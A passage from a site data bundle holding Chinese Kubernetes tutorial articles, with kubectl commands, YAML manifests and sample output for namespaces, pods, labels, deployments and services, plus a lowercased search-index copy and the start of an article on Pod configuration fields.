apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      run: nginx\n  template:\n    metadata:\n      labels:\n        run: nginx\n    spec:\n      containers:\n      - image: nginx:latest\n        name: nginx\n        ports:\n        - containerPort: 80\n          protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f deploy-nginx.yaml\n删除：kubectl delete -f deploy-nginx.yaml\n\n\n# Service\n\n目前已经能够利用 Deployment 来创建一组 Pod 来提供具有高可用性的服务。虽然每个 Pod 都会分配一个单独的 Pod IP，然而却存在如下两问题：\n\n * Pod IP 会随着 Pod 的重建产生变化\n * Pod IP 仅仅是集群内可见的虚拟 IP，外部无法访问\n\n这样对于访问这个服务带来了难度。因此，kubernetes 设计了 Service 来解决这个问题。\n\nService 可以看作是一组同类 Pod 对外的访问接口。借助 Service，应用可以方便地实现服务发现和负载均衡。\n\n\n\n操作一：创建集群内部可访问的 Service\n\n# 暴露Service\n# expose 通过 deploy 查找nginx Pod暴露\n# name 指定名称\n# type 指定类型为集群IP（只有集群内部可以访问），类型有很多\n# port 指定 service 的端口\n# target-port 转发到目标端口\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx1 --type=ClusterIP --port=80 --target-port=80 -n dev\nservice/svc-nginx1 exposed\n\n# 查看service\n[root@master ~]# kubectl get svc svc-nginx1 -n dev -o wide\nNAME         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)   AGE     SELECTOR\nsvc-nginx1   ClusterIP   10.109.179.231   <none>        80/TCP    3m51s   run=nginx\n\n# 这里产生了一个CLUSTER-IP，这就是service的IP，在Service的生命周期中，这个地址是不会变动的\n# 可以通过这个IP访问当前service对应的POD\n[root@master ~]# curl 10.109.179.231:80\n<!DOCTYPE html>\n<html>\n<head>\n<title>Welcome to nginx!</title>\n</head>\n<body>\n<h1>Welcome to nginx!</h1>\n.......\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n操作二：创建集群外部也可访问的 Service\n上面创建的 Service 的 type 类型为 ClusterIP，这个 ip 地址只用集群内部可访问，如果需要创建外部也可以访问的 Service，需要修改 type 为 NodePort\n\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx2 --type=NodePort --port=80 --target-port=80 -n dev\nservice/svc-nginx2 exposed\n\n# 此时查看，会发现出现了NodePort类型的Service，而且有一对Port（80:31928/TC）\n[root@master ~]# kubectl get svc  svc-nginx2  -n dev -o wide\nNAME          TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE    SELECTOR\nsvc-nginx2    NodePort    10.100.94.0      <none>        80:31928/TCP   9s     run=nginx\n\n# 接下来就可以通过集群外的主机访问 节点IP:31928访问服务了\n# 例如在的电脑主机上通过浏览器访问下面的地址\nhttp://192.168.5.4:31928/\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n删除 Service\n\n[root@master ~]# kubectl delete svc svc-nginx-1 -n dev service "svc-nginx-1" deleted\n\n\n1\n\n\n配置方式\n创建一个 svc-nginx.yaml，内容如下：\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: svc-nginx\n  namespace: dev\nspec:\n  # 固定svc的内网ip，如果不指定会随机分配\n  clusterIP: 10.109.179.231 \n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 80\n  selector:\n    run: nginx\n  type: ClusterIP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f svc-nginx.yaml\n删除：kubectl delete -f svc-nginx.yaml',normalizedContent:'# namespace\n\nnamespace 是 kubernetes 系统中的一种非常重要资源，它的主要作用是用来实现多套环境的资源隔离或者多租户的资源隔离。\n\n默认情况下，kubernetes 集群中的所有的 pod 都是可以相互访问的。但是在实际中，可能不想让两个 pod 之间进行互相的访问，那此时就可以将两个 pod 划分到不同的 namespace 下。kubernetes 通过将集群内部的资源分配到不同的 namespace 中，可以形成逻辑上的 "组"，以方便不同的组的资源进行隔离使用和管理。\n\n可以通过 kubernetes 的授权机制，将不同的 namespace 交给不同租户进行管理，这样就实现了多租户的资源隔离。此时还能结合 kubernetes 的资源配额机制，限定不同租户能占用的资源，例如 cpu 使用量、内存使用量等等，来实现租户可用资源的管理。\n\n\n\nkubernetes 在集群启动之后，会默认创建几个 namespace\n\n[root@master ~]# kubectl  get namespace\nname              status   age\ndefault           active   45h     \nkube-node-lease   active   45h  \nkube-public       active   45h     \nkube-system       active   45h    \n\n\n1\n2\n3\n4\n5\n6\n\n * default 所有未指定 namespace 的对象都会被分配在 default 命名空间\n * kube-node-lease 集群节点之间的心跳维护，v1.13 开始引入\n * kube-public 此命名空间下的资源可以被所有人访问（包括未认证用户）\n * kube-system 所有由 kubernetes 系统创建的资源都处于这个命名空间\n\n下面来看 namespace 资源的具体操作：\n查看\n\n# 1 查看所有的ns  命令：kubectl get ns\n[root@master ~]# kubectl get ns\nname              status   age\ndefault           active   45h\nkube-node-lease   active   45h\nkube-public       active   45h     \nkube-system       active   45h     \n\n# 2 查看指定的ns   命令：kubectl get ns ns名称\n[root@master ~]# kubectl get ns default\nname      status   age\ndefault   active   45h\n\n# 3 指定输出格式  命令：kubectl get ns ns名称  -o 格式参数\n# kubernetes支持的格式有很多，比较常见的是wide、json、yaml\n[root@master ~]# kubectl get ns default -o yaml\napiversion: v1\nkind: namespace\nmetadata:\n  creationtimestamp: "2021-05-08t04:44:16z"\n  name: default\n  resourceversion: "151"\n  selflink: /api/v1/namespaces/default\n  uid: 7405f73a-e486-43d4-9db6-145f1409f090\nspec:\n  finalizers:\n  - kubernetes\nstatus:\n  phase: active\n  \n# 4 查看ns详情  命令：kubectl describe ns ns名称\n[root@master ~]# kubectl describe ns default\nname:         default\nlabels:       <none>\nannotations:  <none>\nstatus:       active  # active 命名空间正在使用中  terminating 正在删除命名空间\n\n# resourcequota 针对namespace做的资源限制\n# limitrange针对namespace中的每个组件做的资源限制\nno resource quota.\nno limitrange resource.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n创建\n\n# 创建namespace\n[root@master ~]# kubectl create ns dev\nnamespace/dev created\n\n\n1\n2\n3\n\n\n删除\n\n# 删除namespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n\n\n配置方式\n\napiversion: v1\nkind: namespace\nmetadata:\n  name: dev\n\n\n1\n2\n3\n4\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f ns-dev.yaml\n删除：kubectl delete -f ns-dev.yaml\n\n\n# pod\n\npod 是 kubernetes 集群进行管理的最小单元，程序要运行必须部署在容器中，而容器必须存在于 pod 中。pod 可以认为是容器的封装，一个 pod 中可以存在一个或者多个容器。\n\n\n\nkubernetes 在集群启动之后，集群中的各个组件也都是以 pod 方式运行的。可以通过下面命令查看：\n\n[root@master ~]# kubectl get pod -n kube-system\nnamespace     name                             ready   status    restarts   age\nkube-system   coredns-6955765f44-68g6v         1/1     running   0          2d1h\nkube-system   coredns-6955765f44-cs5r8         1/1     running   0          2d1h\nkube-system   etcd-master                      1/1     running   0          2d1h\nkube-system   kube-apiserver-master            1/1     running   0          2d1h\nkube-system   kube-controller-manager-master   1/1     running   0          2d1h\nkube-system   kube-flannel-ds-amd64-47r25      1/1     running   0          2d1h\nkube-system   kube-flannel-ds-amd64-ls5lh      1/1     running   0          2d1h\nkube-system   kube-proxy-685tk                 1/1     running   0          2d1h\nkube-system   kube-proxy-87spt                 1/1     running   0          2d1h\nkube-system   kube-scheduler-master            1/1     running   0          2d1h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n创建并运行\nkubernetes 没有提供单独运行 pod 的命令，都是通过 pod 控制器来实现的\n\n# 命令格式： kubectl run (pod控制器名称) [参数] \n# --image  指定pod的镜像\n# --port   指定端口\n# --namespace  指定namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --namespace dev \ndeployment.apps/nginx created\n\n\n1\n2\n3\n4\n5\n6\n\n\n查看 pod 信息\n\n# 查看pod基本信息\n[root@master ~]# kubectl get pods -n dev\nname    ready   status    restarts   age\nnginx   1/1     running   0          43s\n\n# 查看pod的详细信息\n[root@master ~]# kubectl describe pod nginx -n dev\nname:         nginx\nnamespace:    dev\npriority:     0\nnode:         node1/192.168.5.4\nstart time:   wed, 08 may 2021 09:29:24 +0800\nlabels:       pod-template-hash=5ff7956ff6\n              run=nginx\nannotations:  <none>\nstatus:       running\nip:           10.244.1.23\nips:\n  ip:           10.244.1.23\ncontrolled by:  replicaset/nginx\ncontainers:\n  nginx:\n    container id:   docker://4c62b8c0648d2512380f4ffa5da2c99d16e05634979973449c98e9b829f6253c\n    image:          nginx:latest\n    image id:       docker-pullable://nginx@sha256:485b610fefec7ff6c463ced9623314a04ed67e3945b9c08d7e53a47f6d108dc7\n    port:           80/tcp\n    host port:      0/tcp\n    state:          running\n      started:      wed, 08 may 2021 09:30:01 +0800\n    ready:          true\n    restart count:  0\n    environment:    <none>\n    mounts:\n      /var/run/secrets/kubernetes.io/serviceaccount from default-token-hwvvw (ro)\nconditions:\n  type              status\n  initialized       true\n  ready             true\n  containersready   true\n  podscheduled      true\nvolumes:\n  default-token-hwvvw:\n    type:        secret (a volume populated by a secret)\n    secretname:  default-token-hwvvw\n    optional:    false\nqos class:       besteffort\nnode-selectors:  <none>\ntolerations:     node.kubernetes.io/not-ready:noexecute for 300s\n                 node.kubernetes.io/unreachable:noexecute for 300s\nevents:\n  type    reason     age        from               message\n  ----    ------     ----       ----               -------\n  normal  scheduled  <unknown>  default-scheduler  successfully assigned dev/nginx-5ff7956ff6-fg2db to node1\n  normal  pulling    4m11s      kubelet, node1     pulling image "nginx:latest"\n  normal  pulled     3m36s      kubelet, node1     successfully pulled image "nginx:latest"\n  normal  created    3m36s      kubelet, node1     created container nginx\n  normal  started    3m36s      kubelet, node1     started container nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n访问 pod\n\n# 获取podip\n[root@master ~]# kubectl get pods -n dev -o wide\nname    ready   status    restarts   age    ip             node    ... \nnginx   1/1     running   0          190s   10.244.1.23   node1   ...\n\n#访问pod\n[root@master ~]# curl http://10.244.1.23:80\n<!doctype html>\n<html>\n<head>\n\t<title>welcome to nginx!</title>\n</head>\n<body>\n\t<p><em>thank you for using nginx.</em></p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n删除指定 pod\n\n# 删除指定pod\n[root@master ~]# kubectl delete pod nginx -n dev\npod "nginx" deleted\n\n# 此时，显示删除pod成功，但是再查询，发现又新产生了一个 \n[root@master ~]# kubectl get pods -n dev\nname    ready   status    restarts   age\nnginx   1/1     running   0          21s\n\n# 这是因为当前pod是由pod控制器创建的，控制器会监控pod状况，一旦发现pod死亡，会立即重建\n# 此时要想删除pod，必须删除pod控制器\n\n# 先来查询一下当前namespace下的pod控制器\n[root@master ~]# kubectl get deploy -n  dev\nname    ready   up-to-date   available   age\nnginx   1/1     1            1           9m7s\n\n# 接下来，删除此podpod控制器\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n# 稍等片刻，再查询pod，发现pod被删除了\n[root@master ~]# kubectl get pods -n dev\nno resources found in dev namespace.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n配置操作\n创建一个 pod-nginx.yaml，内容如下：\n这种创建方式不会像 kubectl run 在创建 pod 时会创建 pod 控制器，以下是不会创建 pod 控制器的。\n\napiversion: v1\nkind: pod\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerport: 80\n      protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f pod-nginx.yaml\n删除：kubectl delete -f pod-nginx.yaml\n\n\n# label\n\nlabel 是 kubernetes 系统中的一个重要概念。它的作用就是在资源上添加标识，用来对它们进行区分和选择。\n\nlabel 的特点：\n\n * 一个 label 会以 key/value 键值对的形式附加到各种对象上，如 node、pod、service 等等\n * 一个资源对象可以定义任意数量的 label ，同一个 label 也可以被添加到任意数量的资源对象上去\n * label 通常在资源对象定义时确定，当然也可以在对象创建后动态添加或者删除\n\n可以通过 label 实现资源的多维度分组，以便灵活、方便地进行资源分配、调度、配置、部署等管理工作。\n\n> 一些常用的 label 示例如下：\n> 版本标签："version":"release", "version":"stable"......\n> 环境标签："environment":"dev"，"environment":"test"，"environment":"pro"\n> 架构标签："tier":"frontend"，"tier":"backend"\n\n标签定义完毕之后，还要考虑到标签的选择，这就要使用到 label selector，即：\nlabel 用于给某个资源对象定义标识\nlabel selector 用于查询和筛选拥有某些标签的资源对象\n\n当前有两种 label selector：\n\n * 基于等式的 label selector\n   name = slave: 选择所有包含 label 中 key="name" 且 value="slave" 的对象\n   env != production: 选择所有包括 label 中的 key="env" 且 value 不等于 "production" 的对象\n * 基于集合的 label selector\n   name in (master, slave): 选择所有包含 label 中的 key="name" 且 value="master" 或 "slave" 的对象\n   name not in (frontend): 选择所有包含 label 中的 key="name" 且 value 不等于 "frontend" 的对象\n\n标签的选择条件可以使用多个，此时将多个 label selector 进行组合，使用逗号 "," 进行分隔即可。例如：\nname=slave，env!=production\nname not in (frontend)，env!=production\n\n命令方式\n\n# 为pod资源打标签\n[root@master ~]# kubectl label pod nginx-pod version=1.0 -n dev\npod/nginx-pod labeled\n\n# 为pod资源更新标签\n[root@master ~]# kubectl label pod nginx-pod version=2.0 -n dev --overwrite\npod/nginx-pod labeled\n\n# 查看标签\n[root@master ~]# kubectl get pod nginx-pod  -n dev --show-labels\nname        ready   status    restarts   age   labels\nnginx-pod   1/1     running   0          10m   version=2.0\n\n# 筛选标签\n[root@master ~]# kubectl get pod -n dev -l version=2.0  --show-labels\nname        ready   status    restarts   age   labels\nnginx-pod   1/1     running   0          17m   version=2.0\n[root@master ~]# kubectl get pod -n dev -l version!=2.0 --show-labels\nno resources found in dev namespace.\n\n#删除标签\n[root@master ~]# kubectl label pod nginx-pod version- -n dev\npod/nginx-pod labeled\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n配置方式\n\napiversion: v1\nkind: pod\nmetadata:\n  name: nginx\n  namespace: dev\n  # 创建时添加标签\n  labels:\n    version: "3.0" \n    env: "test"\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerport: 80\n      protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n然后就可以执行对应的更新命令了：kubectl apply -f pod-nginx.yaml\n\n\n# deployment\n\n在 kubernetes 中，pod 是最小的控制单元，但是 kubernetes 很少直接控制 pod，一般都是通过 pod 控制器来完成的。pod 控制器用于 pod 的管理，确保 pod 资源符合预期的状态，当 pod 的资源出现故障时，会尝试进行重启或重建 pod。\n\n在 kubernetes 中 pod 控制器的种类有很多，本章节只介绍一种：deployment。\n\n\n\n命令操作\n\n# 命令格式: kubectl run deployment名称  [参数] \n# --image  指定pod的镜像\n# --port   指定端口\n# --replicas  指定创建pod数量\n# --namespace  指定namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --replicas=3 -n dev\ndeployment.apps/nginx created\n\n# 查看创建的pod\n[root@master ~]# kubectl get pods -n dev\nname                     ready   status    restarts   age\nnginx-5ff7956ff6-6k8cb   1/1     running   0          19s\nnginx-5ff7956ff6-jxfjt   1/1     running   0          19s\nnginx-5ff7956ff6-v6jqw   1/1     running   0          19s\n\n# 查看deployment的信息\n[root@master ~]# kubectl get deploy -n dev\nname    ready   up-to-date   available   age\nnginx   3/3     3            3           2m42s\n\n# up-to-date：成功升级的副本数量\n# available：可用副本的数量\n[root@master ~]# kubectl get deploy -n dev -o wide\nname    ready up-to-date  available   age     containers   images              selector\nnginx   3/3     3         3           2m51s   nginx        nginx:latest        run=nginx\n\n# 查看deployment的详细信息\n[root@master ~]# kubectl describe deploy nginx -n dev\nname:                   nginx\nnamespace:              dev\ncreationtimestamp:      wed, 08 may 2021 11:14:14 +0800\nlabels:                 run=nginx\nannotations:            deployment.kubernetes.io/revision: 1\nselector:               run=nginx\nreplicas:               3 desired | 3 updated | 3 total | 3 available | 0 unavailable\nstrategytype:           rollingupdate\nminreadyseconds:        0\nrollingupdatestrategy:  25% max unavailable, 25% max surge\npod template:\n  labels:  run=nginx\n  containers:\n   nginx:\n    image:        nginx:latest\n    port:         80/tcp\n    host port:    0/tcp\n    environment:  <none>\n    mounts:       <none>\n  volumes:        <none>\nconditions:\n  type           status  reason\n  ----           ------  ------\n  available      true    minimumreplicasavailable\n  progressing    true    newreplicasetavailable\noldreplicasets:  <none>\nnewreplicaset:   nginx-5ff7956ff6 (3/3 replicas created)\nevents:\n  type    reason             age    from                   message\n  ----    ------             ----   ----                   -------\n  normal  scalingreplicaset  5m43s  deployment-controller  scaled up replicaset nginx-5ff7956ff6 to 3\n  \n# 删除,对应的pod也会删除\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\n配置操作\n创建一个 deploy-nginx.yaml，内容如下：\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchlabels:\n      run: nginx\n  template:\n    metadata:\n      labels:\n        run: nginx\n    spec:\n      containers:\n      - image: nginx:latest\n        name: nginx\n        ports:\n        - containerport: 80\n          protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f deploy-nginx.yaml\n删除：kubectl delete -f deploy-nginx.yaml\n\n\n# service\n\n目前已经能够利用 deployment 来创建一组 pod 来提供具有高可用性的服务。虽然每个 pod 都会分配一个单独的 pod ip，然而却存在如下两问题：\n\n * pod ip 会随着 pod 的重建产生变化\n * pod ip 仅仅是集群内可见的虚拟 ip，外部无法访问\n\n这样对于访问这个服务带来了难度。因此，kubernetes 设计了 service 来解决这个问题。\n\nservice 可以看作是一组同类 pod 对外的访问接口。借助 service，应用可以方便地实现服务发现和负载均衡。\n\n\n\n操作一：创建集群内部可访问的 service\n\n# 暴露service\n# expose 通过 deploy 查找nginx pod暴露\n# name 指定名称\n# type 指定类型为集群ip（只有集群内部可以访问），类型有很多\n# port 指定 service 的端口\n# target-port 转发到目标端口\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx1 --type=clusterip --port=80 --target-port=80 -n dev\nservice/svc-nginx1 exposed\n\n# 查看service\n[root@master ~]# kubectl get svc svc-nginx1 -n dev -o wide\nname         type        cluster-ip       external-ip   port(s)   age     selector\nsvc-nginx1   clusterip   10.109.179.231   <none>        80/tcp    3m51s   run=nginx\n\n# 这里产生了一个cluster-ip，这就是service的ip，在service的生命周期中，这个地址是不会变动的\n# 可以通过这个ip访问当前service对应的pod\n[root@master ~]# curl 10.109.179.231:80\n<!doctype html>\n<html>\n<head>\n<title>welcome to nginx!</title>\n</head>\n<body>\n<h1>welcome to nginx!</h1>\n.......\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n操作二：创建集群外部也可访问的 service\n上面创建的 service 的 type 类型为 clusterip，这个 ip 地址只用集群内部可访问，如果需要创建外部也可以访问的 service，需要修改 type 为 nodeport\n\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx2 --type=nodeport --port=80 --target-port=80 -n dev\nservice/svc-nginx2 exposed\n\n# 此时查看，会发现出现了nodeport类型的service，而且有一对port（80:31928/tc）\n[root@master ~]# kubectl get svc  svc-nginx2  -n dev -o wide\nname          type        cluster-ip       external-ip   port(s)        age    selector\nsvc-nginx2    nodeport    10.100.94.0      <none>        80:31928/tcp   9s     run=nginx\n\n# 接下来就可以通过集群外的主机访问 节点ip:31928访问服务了\n# 例如在的电脑主机上通过浏览器访问下面的地址\nhttp://192.168.5.4:31928/\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n删除 service\n\n[root@master ~]# kubectl delete svc svc-nginx-1 -n dev service "svc-nginx-1" deleted\n\n\n1\n\n\n配置方式\n创建一个 svc-nginx.yaml，内容如下：\n\napiversion: v1\nkind: service\nmetadata:\n  name: svc-nginx\n  namespace: dev\nspec:\n  # 固定svc的内网ip，如果不指定会随机分配\n  clusterip: 10.109.179.231 \n  ports:\n  - port: 80\n    protocol: tcp\n    targetport: 80\n  selector:\n    run: nginx\n  type: clusterip\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f svc-nginx.yaml\n删除：kubectl delete -f svc-nginx.yaml',charsets:{cjk:!0}},{title:"kubernetes(五) Pod 介绍及配置",frontmatter:{title:"kubernetes(五) Pod 介绍及配置",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/604",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/604.kubernetes(%E4%BA%94)%20Pod%20%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE.html",relativePath:"04.运维/60.Kubernetes/604.kubernetes(五) Pod 介绍及配置.md",key:"v-589af7a8",path:"/kubernetes/604/",headers:[{level:2,title:"介绍",slug:"介绍",normalizedTitle:"介绍",charIndex:2},{level:3,title:"Pod结构",slug:"pod结构",normalizedTitle:"pod 结构",charIndex:9},{level:3,title:"Pod定义",slug:"pod定义",normalizedTitle:"pod 定义",charIndex:258},{level:2,title:"Pod配置",slug:"pod配置",normalizedTitle:"pod 配置",charIndex:5169},{level:3,title:"基本配置",slug:"基本配置",normalizedTitle:"基本配置",charIndex:5723},{level:3,title:"镜像拉取",slug:"镜像拉取",normalizedTitle:"镜像拉取",charIndex:5466},{level:3,title:"启动命令",slug:"启动命令",normalizedTitle:"启动命令",charIndex:714},{level:3,title:"环境变量",slug:"环境变量",normalizedTitle:"环境变量",charIndex:1216},{level:3,title:"端口设置",slug:"端口设置",normalizedTitle:"端口设置",charIndex:10966},{level:3,title:"资源配额",slug:"资源配额",normalizedTitle:"资源配额",charIndex:12205}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"介绍 Pod结构 Pod定义 Pod配置 基本配置 镜像拉取 启动命令 环境变量 端口设置 资源配额",content:'# 介绍\n\n\n# Pod 结构\n\n\n\n每个 Pod 中都可以包含一个或者多个容器，这些容器可以分为两类：\n\n * 用户程序所在的容器，数量可多可少\n * Pause 容器，这是每个 Pod 都会有的一个根容器，它的作用有两个：\n   * 可以以它为依据，评估整个 Pod 的健康状态\n   * 可以在根容器上设置 Ip 地址，其它容器都此 Ip（Pod IP），以实现 Pod 内部的网路通信\n     这里是Pod内部的通讯，Pod的之间的通讯采用虚拟二层网络技术来实现，我们当前环境用的是Flannel\n\n\n# Pod 定义\n\n下面是 Pod 的资源清单：\n\napiVersion: v1     #必选，版本号，例如v1\nkind: Pod       　 #必选，资源类型，例如 Pod\nmetadata:       　 #必选，元数据\n  name: string     #必选，Pod名称\n  namespace: string  #Pod所属的命名空间,默认为"default"\n  labels:       　　  #自定义标签列表\n    - name: string      　          \nspec:  #必选，Pod中容器的详细定义\n  containers:  #必选，Pod中容器列表\n  - name: string   #必选，容器名称\n    image: string  #必选，容器的镜像名称\n    imagePullPolicy: [ Always|Never|IfNotPresent ]  #获取镜像的策略 \n    command: [string]   #容器的启动命令列表，如不指定，使用打包时使用的启动命令\n    args: [string]      #容器的启动命令参数列表\n    workingDir: string  #容器的工作目录\n    volumeMounts:       #挂载到容器内部的存储卷配置\n    - name: string      #引用pod定义的共享存储卷的名称，需用volumes[]部分定义的的卷名\n      mountPath: string #存储卷在容器内mount的绝对路径，应少于512字符\n      readOnly: boolean #是否为只读模式\n    ports: #需要暴露的端口库号列表\n    - name: string        #端口的名称\n      containerPort: int  #容器需要监听的端口号\n      hostPort: int       #容器所在主机需要监听的端口号，默认与Container相同\n      protocol: string    #端口协议，支持TCP和UDP，默认TCP\n    env:   #容器运行前需设置的环境变量列表\n    - name: string  #环境变量名称\n      value: string #环境变量的值\n    resources: #资源限制和请求的设置\n      limits:  #资源限制的设置\n        cpu: string     #Cpu的限制，单位为core数，将用于docker run --cpu-shares参数\n        memory: string  #内存限制，单位可以为Mib/Gib，将用于docker run --memory参数\n      requests: #资源请求的设置\n        cpu: string    #Cpu请求，容器启动的初始可用数量\n        memory: string #内存请求,容器启动的初始可用数量\n    lifecycle: #生命周期钩子\n        postStart: #容器启动后立即执行此钩子,如果执行失败,会根据重启策略进行重启\n        preStop: #容器终止前执行此钩子,无论结果如何,容器都会终止\n    livenessProbe:  #对Pod内各容器健康检查的设置，当探测无响应几次后将自动重启该容器\n      exec:       　 #对Pod容器内检查方式设置为exec方式\n        command: [string]  #exec方式需要制定的命令或脚本\n      httpGet:       #对Pod内个容器健康检查方法设置为HttpGet，需要制定Path、port\n        path: string\n        port: number\n        host: string\n        scheme: string\n        HttpHeaders:\n        - name: string\n          value: string\n      tcpSocket:     #对Pod内个容器健康检查方式设置为tcpSocket方式\n         port: number\n       initialDelaySeconds: 0       #容器启动完成后首次探测的时间，单位为秒\n       timeoutSeconds: 0    　　    #对容器健康检查探测等待响应的超时时间，单位秒，默认1秒\n       periodSeconds: 0     　　    #对容器监控检查的定期探测时间设置，单位秒，默认10秒一次\n       successThreshold: 0\n       failureThreshold: 0\n       securityContext:\n         privileged: false\n  restartPolicy: [Always | Never | OnFailure]  #Pod的重启策略\n  nodeName: <string> #设置NodeName表示将该Pod调度到指定到名称的node节点上\n  nodeSelector: obeject #设置NodeSelector表示将该Pod调度到包含这个label的node上\n  imagePullSecrets: #Pull镜像时使用的secret名称，以key：secretkey格式指定\n  - name: string\n  hostNetwork: false   #是否使用主机网络模式，默认为false，如果设置为true，表示使用宿主机网络\n  volumes:   #在该pod上定义共享存储卷列表\n  - name: string    #共享存储卷名称 （volumes类型有很多种）\n    emptyDir: {}       #类型为emtyDir的存储卷，与Pod同生命周期的一个临时目录。为空值\n    hostPath: string   #类型为hostPath的存储卷，表示挂载Pod所在宿主机的目录\n      path: string      　　        #Pod所在宿主机的目录，将被用于同期中mount的目录\n    secret:       　　　#类型为secret的存储卷，挂载集群与定义的secret对象到容器内部\n      scretname: string  \n      items:     \n      - key: string\n        path: string\n    configMap:         #类型为configMap的存储卷，挂载预定义的configMap对象到容器内部\n      name: string\n      items:\n      - key: string\n        path: string\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n\n\n不知道相关的 type 有什么资源类型可写，可以通过一个命令来查看每种资源的可配置项\n\n#   kubectl explain 资源类型         查看某种资源可以配置的一级属性\n#   kubectl explain 资源类型.属性     查看属性的子属性\n[root@k8s-master01 ~]# kubectl explain pod\nKIND:     Pod\nVERSION:  v1\nFIELDS:\n   apiVersion   <string>\n   kind <string>\n   metadata     <Object>\n   spec <Object>\n   status       <Object>\n\n[root@k8s-master01 ~]# kubectl explain pod.metadata\nKIND:     Pod\nVERSION:  v1\nRESOURCE: metadata <Object>\nFIELDS:\n   annotations  <map[string]string>\n   clusterName  <string>\n   creationTimestamp    <string>\n   deletionGracePeriodSeconds   <integer>\n   deletionTimestamp    <string>\n   finalizers   <[]string>\n   generateName <string>\n   generation   <integer>\n   labels       <map[string]string>\n   managedFields        <[]Object>\n   name <string>\n   namespace    <string>\n   ownerReferences      <[]Object>\n   resourceVersion      <string>\n   selfLink     <string>\n   uid  